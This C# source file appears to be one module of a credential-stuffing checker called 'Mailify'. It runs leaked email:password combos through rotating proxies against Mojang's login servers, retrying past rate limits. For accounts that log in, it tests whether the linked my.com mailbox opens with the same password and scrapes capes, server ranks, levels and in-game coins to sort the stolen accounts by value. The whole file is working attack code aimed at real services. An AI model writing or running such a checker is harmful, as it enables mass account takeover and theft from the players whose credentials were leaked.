using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using Newtonsoft.Json.Linq;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using System.Text;

namespace Mailify
{
    internal class Mc_Mode_AntisilentBan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.McMode_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static Uri mojangAuth = new Uri("https://authserver.mojang.com/authenticate");
        static void Worker(string combo)
        {
            var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
        RETRY:
            try
            {
                using (HttpRequest req = new HttpRequest())
                {

                    SetBasicRequestSettingsAndProxies(req);


                    req.AddHeader("Content-Type", "application/json");
                    HttpResponse res;
                    try
                    {
                        res = req.Post(new Uri($"https://authserver.mojang.com/refresh"), new BytesContent(Encoding.Default.GetBytes("\"{\\\"accessToken\\\":\\\"2545345\\\",\\\"clientToken\\\":\\\"34535343\\\"}\"")));
                    }
                    catch (Exception e)
                    {

                        Variables.Errors++;
                        goto RETRY;
                    }
                    string login = res.ToString();
                    if (login.Contains("TooManyRequestsException"))
                    {

                        Variables.Errors++;
                        goto RETRY;
                    }
                    else if (login.Contains("cloudflare"))
                    {

                        Variables.Errors++;
                        goto RETRY;
                    }
                    else if (login.Contains("Unsupported Media Type"))
                    {

                        Variables.Errors++;
                        goto RETRY;
                    }
                    else if (login.Contains("ForbiddenOperationException"))
                    {
                        req.AddHeader("Content-Type", "application/json");
                        HttpResponse response = req.Post(mojangAuth, new BytesContent(Encoding.Default.GetBytes("{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\": \"" + credentials[0] + "\",\"password\": \"" + credentials[1] + "\",\"requestUser\": \"true\"}")));

                        string cap = response.ToString();

                        if (cap.Contains("errorMessage"))
                        {
                            req.AddHeader("Content-Type", "application/json");
                            HttpResponse res12;
                            try
                            {

                                res12 = req.Post(new Uri($"https://authserver.mojang.com/refresh"), new BytesContent(Encoding.Default.GetBytes("\"{\\\"accessToken\\\":\\\"2545345\\\",\\\"clientToken\\\":\\\"34535343\\\"}\"")));
                            }
                            catch
                            {

                                Variables.Errors++;
                                goto RETRY;
                            }
                            string Check12 = res12.ToString();
                            if (Check12.Contains("ForbiddenOperationException"))
                            {
                                Variables.Invalid++;
                                Variables.Checked++;
                                Variables.cps++;
                                lock (Variables.WriteLock)
                                {
                                    Variables.remove(combo);
                                }
                            }
                            else
                            {

                                Variables.Errors++;
                                goto RETRY;
                            }
                        }
                        else if (cap.Contains("selectedProfile"))
                        {
                            Variables.GettingCaptures++;

                            List<string> Captures = new List<string>();

                            var accesstoken = Functions.JSON(cap, "accessToken").FirstOrDefault();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            req.AddHeader("authorization", $"Bearer {accesstoken}");
                            string getusername = req.Get("https://api.minecraftservices.com/minecraft/profile").ToString();
                            var username = Functions.JSON(getusername, "name").FirstOrDefault();
                            if (Variables.OGNAMES.Any((string og) => og == username.ToLower()))
                            {
                                lock (Variables.WriteLock)
                                {
                                    File.AppendAllText(Variables.results + "OG_Names.txt", combo + " | Username: " + username + Environment.NewLine);
                                }
                            }
                            Captures.Add("Username: " + username);
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            string gettoken = req.Get("https://account.mojang.com/login").ToString();
                            var token = Functions.LR(gettoken, "name=\"authenticityToken\" value=\"", "\"/>").FirstOrDefault();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            string getType = req.Post("https://account.mojang.com/login", $"authenticityToken={token}&username={credentials[0]}&password={credentials[1]}", "application/x-www-form-urlencoded").ToString();
                            if (getType.Contains("title=\"Log out\""))
                            {

                            RETRY1:
                                try
                                {

                                    string type = null;

                                    req.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
                                    string strResponse = req.Get(new Uri($"https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login={credentials[0]}&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password={credentials[1]}&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString();
                                    if (strResponse.Contains("Ok=1"))
                                    {
                                        type = "MFA";
                                        Variables.MFA++;
                                    }
                                    else
                                    {
                                        if (getType.Contains("Your account has not been secured"))
                                        {
                                            type = "SFA";
                                            Variables.SFA++;
                                        }
                                        else
                                        {
                                            type = "NFA";
                                            Variables.NFA++;
                                        }
                                    }
                                    lock (Variables.WriteLock)
                                    {
                                        File.AppendAllText(Variables.results + $"{type}.txt", combo + Environment.NewLine);
                                    }
                                    Captures.Add("Type: " + type);
                                    //Cape Captures
                                    req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");
                                    var res1 = req.Get("https://namemc.com/profile/" + username);
                                    bool hasOptifine = res1.ToString().Contains("optifine.net");
                                    bool hasMinecon = res1.ToString().Contains("MineCon");
                                    if (hasOptifine)
                                    {
                                        Variables.Optifine++;
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Capes_Folder + $"Optifine.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    if (hasMinecon)
                                    {
                                        Variables.Minecon++;
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Capes_Folder + $"Minecon.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    Captures.Add("Optifine: " + hasOptifine);
                                    Captures.Add("Minecoin: " + hasMinecon);
                                    //Hypixel Lvl/Rank
                                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                                    string ee = req.Get("https://plancke.io/hypixel/player/stats/" + username).ToString();

                                    var Hypixel_Lvl = Functions.LR(ee, "Level:</b> ", "<br").FirstOrDefault();
                                    var Hypixel_Rank = Functions.LR(ee, "content=\"[", "]").FirstOrDefault();


                                    if (Hypixel_Rank != null)
                                    {
                                        Variables.Hypixel_Ranked++;
                                        Captures.Add($"Hypixel Rank: {Hypixel_Rank}");
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Hypixel_Ranked_folder + $"{Hypixel_Rank}.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    if (Hypixel_Lvl != null)
                                    {
                                        Variables.Hypixel_Lvl++;
                                        Captures.Add($"Hypixel Lvl: {Hypixel_Lvl}");
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Hypixel_Leveled_Folder + $"{Hypixel_Lvl}.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    //velt pvp
                                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                    string heel = req.Get("https://www.veltpvp.com/u/" + username).ToString();

                                    var VeltColour = Functions.LR(heel, "<h2 style=\"color: #", "\"").FirstOrDefault();
                                    var VeltRank = Functions.LR(heel, $"<h2 style=\"color: #{VeltColour}\">", "</h2>").FirstOrDefault();

                                    if (VeltRank != null)
                                    {
                                        Variables.veltpvp++;
                                        Captures.Add("Veltpvp Rank: " + VeltRank);
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.VeltPvp_Folder + $"{VeltRank}.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    //hive
                                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                    string gee = req.Get($"http://api.hivemc.com/v1/player/" + username).ToString();

                                    var HiveRank = Functions.JSON(gee, "enum").FirstOrDefault();

                                    if (HiveRank != null)
                                    {
                                        Variables.Hive++;
                                        Captures.Add("Hivemc Rank: " + HiveRank);
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Hive_folder + $"{HiveRank}.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    //skyblock
                                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                                    string hel = req.Get("https://sky.lea.moe/stats/" + username).ToString();

                                    var skyblockcoins = Functions.LR(hel, "Purse Balance: </span><span class='stat-value'>", "Coins</span><br><").FirstOrDefault();

                                    if (skyblockcoins != "0" && skyblockcoins != null)
                                    {
                                        Variables.Skyblock++;
                                        Captures.Add("Skyblock Coins: " + skyblockcoins);
                                        lock (Variables.WriteLock)
                                        {
                                            File.AppendAllText(Variables.Skyblock_Coins_Folder + $"{skyblockcoins}.txt", combo + Environment.NewLine);
                                        }
                                    }
                                    string output = $"{combo} | " + string.Join(" | ", Captures);

                                    Variables.GettingCaptures--;
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);

                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] {output}", Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + "Total_hits.txt", output + Environment.NewLine);
                                    }
                                }
                                catch
                                {
                                    Variables.Errors++;
                                    goto RETRY1;
                                }
                            }

                            else
                            {
                                Variables.Errors++;
                                goto RETRY;
                            }
                        }
                    }
                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
        public static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 8000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;
            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
            string[] proxy = getProxy().Split(':');
            ProxyClient proxyClient = proxyType == ProxyType.Socks5 ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : proxyType == ProxyType.Socks4 ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
            if (proxy.Length == 4)
            {
                proxyClient.Username = proxy[2];
                proxyClient.Password = proxy[3];
            }
            req.Proxy = proxyClient;
        }
        static string getProxy()
        {
            return Variables.proxies.ElementAt(new Random().Next(0, Variables.proxies.Length)); ;
        }
    }
}